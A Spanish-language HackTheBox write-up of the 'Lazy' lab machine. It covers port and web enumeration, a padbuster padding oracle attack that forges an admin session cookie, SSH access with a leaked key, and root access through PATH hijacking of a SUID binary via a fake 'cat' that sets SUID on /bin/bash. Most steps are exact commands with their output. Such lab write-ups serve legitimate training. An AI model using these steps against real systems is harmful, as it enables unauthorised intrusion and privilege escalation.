Máquina "Lazy" de HackTheBox

## Características:

- Linux
- Padding oracle attack (padbuster)
- Bit flipper attack (Burp suite)
- Obtención de cookies de usuario admin
- Abuso de binarios SUID
- PATH Hijacking (escalada de privilegios)
- Enumeración externa
- Apache
- PHP
- Nivel: Penetration Tester Level 3
- Autenticación débil
- A01:2021-Broken Access Control
- Explotación de SUID
- Autenticación

## Útil para:

- eWPT
- OSWE
- OSCP

## Reconocimiento

IP: 10.10.10.18

Escaneo inicial:
```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.18 -oG allPorts
```

Puertos abiertos:
- 22 ssh
- 80 http

Escaneo detallado:
```bash
sudo nmap -sCV -p22,80 10.10.10.18 -oN targeted
```

Resultados:
```
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
```

Buscamos el codename (launchpad):
```
Codename: Ubuntu Trusty
```

Análisis con whatweb:
```bash
whatweb http://10.10.10.18
```

Resultados:
```
http://10.10.10.18 [200 OK] Apache[2.4.7], Bootstrap, Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.10.10.18], PHP[5.5.9-1ubuntu4.21], 
Title[CompanyDev], X-Powered-By[PHP/5.5.9-1ubuntu4.21]
```

## Análisis de la página web

Abrimos la página:

![Página principal](/secciones/posts/imagenes/lazy/web1.png)

Tenemos login y register. Probamos con credenciales típicos e inyecciones SQL simples sin éxito.

## Fuzzing

Ejecutamos fuzzing para encontrar archivos PHP:
```bash
sudo wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.18/FUZZ.php
```

No obtuvimos resultados relevantes.

## Análisis de cookies

Inspeccionamos la cookie de sesión, que está en cifrado CBC. Usaremos padbuster para un ataque de padding oracle:

```bash
padbuster http://10.10.10.18/index.php 'rfad9ywFSd7AuWI0syvxOp%2Bs%2B8RgEn5w' 8 -cookies 'auth=rfad9ywFSd7AuWI0syvxOp%2Bs%2B8RgEn5w'
```

Resultado:
```
*** Finished ***

[+] Decrypted value (ASCII): user=kar
[+] Decrypted value (HEX): 757365723D6B61720808080808080808
[+] Decrypted value (Base64): dXNlcj1rYXIICAgICAgICA==
```

## Confirmación de vulnerabilidad CBC

Otra forma de confirmar si se está usando CBC es con Burp Suite:
1. Configuramos el proxy
2. Recargamos la página
3. Enviamos la petición al Repeater
4. Modificamos la cookie
5. Obtenemos respuesta "invalid padding", confirmando la vulnerabilidad

## Elevación a admin

Generamos una cookie para el usuario admin:
```bash
padbuster http://10.10.10.18/index.php 'rfad9ywFSd7AuWI0syvxOp%2Bs%2B8RgEn5w' 8 -cookies 'auth=rfad9ywFSd7AuWI0syvxOp%2Bs%2B8RgEn5w' -plaintext "user=admin"
```

Resultado:
```
*** Finished ***

[+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
```

Usamos esta cookie en la sesión y accedemos como admin, donde encontramos una clave SSH privada.

## Acceso SSH

Conectamos usando la clave privada:
```bash
ssh -i id_rsa mitsos@10.10.10.18
```

Obtenemos la flag de usuario. Encontramos un archivo backup con privilegios SUID.

## Análisis del binario SUID

Ejecutamos strings en el binario:
```bash
strings backup
```

Observamos que `cat` está siendo llamado de forma relativa (no absoluta), lo que permite un PATH Hijacking.

## Explotación de PATH Hijacking

1. Creamos un archivo malicioso en /tmp:
```bash
echo 'chmod u+s /bin/bash' > /tmp/cat
chmod +x /tmp/cat
```

2. Modificamos el PATH:
```bash
export PATH=/tmp:$PATH
```

3. Ejecutamos el binario backup:
```bash
./backup
```

4. Verificamos los permisos de bash:
```bash
ls -l /bin/bash
```

5. Obtenemos una bash con privilegios root:
```bash
bash -p
```

Finalmente buscamos y obtenemos la flag de root.
 